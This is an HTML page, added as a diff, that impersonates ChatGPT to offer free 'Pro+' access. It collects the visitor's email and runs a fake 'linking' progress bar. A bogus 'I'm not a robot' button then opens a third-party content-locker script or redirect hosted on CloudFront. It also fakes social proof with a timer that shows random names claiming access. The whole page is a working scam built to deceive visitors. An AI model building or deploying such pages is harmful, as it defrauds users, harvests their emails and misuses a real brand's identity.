@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChatGPT PRO+ | Official Neural Access 2026</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #10a37f; --bg: #000; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body, html { height: 100%; background: var(--bg); color: white; overflow: hidden; }
+
+        /* VIDEO-STYLE BINDI BACKGROUND */
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.5; }
+        .wrapper { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { width: 90%; max-width: 450px; background: rgba(18, 18, 18, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 40px 25px; text-align: center; box-shadow: 0 40px 80px rgba(0,0,0,0.8); }
+
+        /* LOGO HAMESHA TOP PAR */
+        .header-logo { width: 65px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary)); }
+
+        #step-email, #step-processing, #step-captcha { display: none; }
+        h1 { font-size: 24px; margin-bottom: 20px; font-weight: 900; letter-spacing: -0.5px; }
+
+        /* PLANS OPTIONS */
+        .options-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
+        .plan-card { background: #1a1a1a; border: 2px solid #333; padding: 22px 10px; border-radius: 18px; cursor: pointer; transition: 0.3s; position: relative; }
+        .plan-card.selected { border-color: var(--primary); background: rgba(16, 163, 127, 0.1); }
+        .tick-icon { position: absolute; top: 12px; right: 12px; width: 18px; height: 18px; border-radius: 50%; border: 1px solid #444; transition: 0.3s; }
+        .selected .tick-icon { background: var(--primary); border-color: var(--primary); background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E"); background-size: 12px; background-repeat: no-repeat; background-position: center; }
+
+        input[type="email"] { width: 100%; padding: 18px; border-radius: 12px; border: 1px solid #333; background: #000; color: white; margin-bottom: 20px; text-align: center; font-size: 16px; outline: none; }
+        input:focus { border-color: var(--primary); }
+
+        .main-btn { width: 100%; padding: 20px; background: var(--primary); color: white; border: none; border-radius: 14px; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; box-shadow: 0 10px 20px rgba(16, 163, 127, 0.2); }
+        .main-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .main-btn:hover:not(:disabled) { transform: translateY(-2px); background: #0d8a6a; }
+
+        /* LOADER BOX */
+        .progress-bg { width: 100%; height: 8px; background: #222; border-radius: 10px; overflow: hidden; margin-top: 25px; }
+        .progress-fill { width: 0%; height: 100%; background: var(--primary); box-shadow: 0 0 15px var(--primary); transition: width 0.1s linear; }
+        #status-msg { font-size: 12px; color: var(--primary); margin-top: 15px; font-family: monospace; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* USA LIVE PROOFS */
+        .proof-box { position: fixed; bottom: 20px; left: 20px; background: white; color: black; padding: 14px 20px; border-radius: 15px; font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 10px; animation: slideUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 1000; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
+        @keyframes slideUp { from { transform: translateY(120px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <canvas id="bg-canvas"></canvas>
+
+    <div class="wrapper">
+        <div class="container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="header-logo">
+
+            <div id="step-plans">
+                <h1>Choose Access Level</h1>
+                <div class="options-grid">
+                    <div class="plan-card" onclick="selectPlan(this)">
+                        <div class="tick-icon"></div>
+                        <h3>1 Month</h3>
+                        <p>Experimental</p>
+                    </div>
+                    <div class="plan-card" onclick="selectPlan(this)">
+                        <div class="tick-icon"></div>
+                        <h3>1 Year</h3>
+                        <p>Full Neural+</p>
+                    </div>
+                </div>
+                <button class="main-btn" id="planBtn" disabled onclick="toNext('step-plans', 'step-email')">CONTINUE</button>
+            </div>
+
+            <div id="step-email">
+                <h1>Verify Account</h1>
+                <p style="color:#777; font-size:14px; margin-bottom:20px;">Enter your email to link the license.</p>
+                <input type="email" id="userEmail" placeholder="e.g. john.doe@gmail.com">
+                <button class="main-btn" onclick="startLoading()">CLAIM ACCESS</button>
+            </div>
+
+            <div id="step-processing">
+                <h1>Linking Neural Port...</h1>
+                <div class="progress-bg"><div class="progress-fill" id="bar"></div></div>
+                <div id="status-msg">Contacting OpenAI API...</div>
+            </div>
+
+            <div id="step-captcha">
+                <h1 style="color:#ff4b4b;">Verification Required</h1>
+                <p style="color:#888; font-size:14px; margin-bottom:25px;">Please prove you are not a bot to finalize your Pro+ credentials.</p>
+                <button class="main-btn" style="background:white; color:black; border:1px solid #ddd;" onclick="openLockerForce()">I'M NOT A ROBOT</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="proof-container"></div>
+    <audio id="tickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
+
+    <script type="text/javascript">
+        var akvzP_XHK_JSOzFc={"it":4559230,"key":"41579"};
+    </script>
+    <script src="https://d19k1sh57v5k0g.cloudfront.net/dd0208c.js"></script>
+
+    <script>
+        // BACKGROUND ANIMATION
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        let dots = [];
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        for(let i=0; i<80; i++) dots.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*2.2, v: Math.random()*0.5});
+        function draw() {
+            ctx.clearRect(0,0,canvas.width, canvas.height);
+            ctx.fillStyle = '#10a37f';
+            dots.forEach(d => {
+                ctx.beginPath(); ctx.arc(d.x, d.y, d.r, 0, Math.PI*2); ctx.fill();
+                d.y -= d.v; if(d.y < 0) d.y = canvas.height;
+            });
+            requestAnimationFrame(draw);
+        }
+        draw();
+
+        // LOGIC
+        function selectPlan(el) {
+            document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            document.getElementById('planBtn').disabled = false;
+            document.getElementById('tickSound').play();
+        }
+
+        function toNext(h, s) {
+            document.getElementById(h).style.display = 'none';
+            document.getElementById(s).style.display = 'block';
+        }
+
+        function startLoading() {
+            const mail = document.getElementById('userEmail').value;
+            if(!mail.includes('@')) return alert("Please enter a valid email address.");
+            toNext('step-email', 'step-processing');
+            let w = 0;
+            const bar = document.getElementById('bar');
+            const msg = document.getElementById('status-msg');
+            const timer = setInterval(() => {
+                w += 0.8;
+                bar.style.width = w + "%";
+                if(w > 30) msg.innerText = "Encrypting UID Tunnel...";
+                if(w > 65) msg.innerText = "Allocating Sora Video API...";
+                if(w > 90) msg.innerText = "Access Ready...";
+                if(w >= 100) {
+                    clearInterval(timer);
+                    toNext('step-processing', 'step-captcha');
+                }
+            }, 45);
+        }
+
+        // --- LOCKER TRIGGER (akvzP_XHK_JSOzFc) ---
+        function openLockerForce() {
+            // Hum sabhi possible triggers check karenge
+            if (typeof call_locker === "function") {
+                call_locker();
+            } else if (typeof og_load === "function") {
+                og_load();
+            } else {
+                // Last resort: Redirect to direct locker link if script fails
+                window.location.href = "https://d19k1sh57v5k0g.cloudfront.net/cl/i/41579";
+            }
+        }
+
+        // USA LIVE PROOFS
+        const names = ["James H.", "Emma R.", "Michael S.", "Olivia B.", "David K.", "Sophia M."];
+        const states = ["New York", "California", "Texas", "Florida", "Chicago", "Seattle"];
+        setInterval(() => {
+            const n = names[Math.floor(Math.random()*names.length)];
+            const s = states[Math.floor(Math.random()*states.length)];
+            const cont = document.getElementById('proof-container');
+            cont.innerHTML = `<div class="proof-box">👤 ${n} from ${s} just claimed 1 Year Pro+ Access!</div>`;
+            setTimeout(() => cont.innerHTML = '', 4500);
+        }, 9500);
+    </script>
+</body>
+</html>
